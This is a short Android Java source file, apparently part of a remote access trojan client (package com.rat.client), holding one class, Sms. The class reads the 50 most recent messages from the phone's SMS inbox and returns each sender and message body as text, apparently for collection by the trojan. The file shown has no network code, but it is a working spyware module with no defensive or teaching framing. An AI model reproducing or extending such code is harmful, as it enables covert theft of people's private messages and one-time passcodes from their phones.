package com.rat.client;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class Sms {
    public static String dump(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50");
            StringBuilder sb = new StringBuilder();
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndex("address")))
                  .append(": ")
                  .append(c.getString(c.getColumnIndex("body")))
                  .append("\n");
            }
            c.close();
            return sb.toString();
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }
}
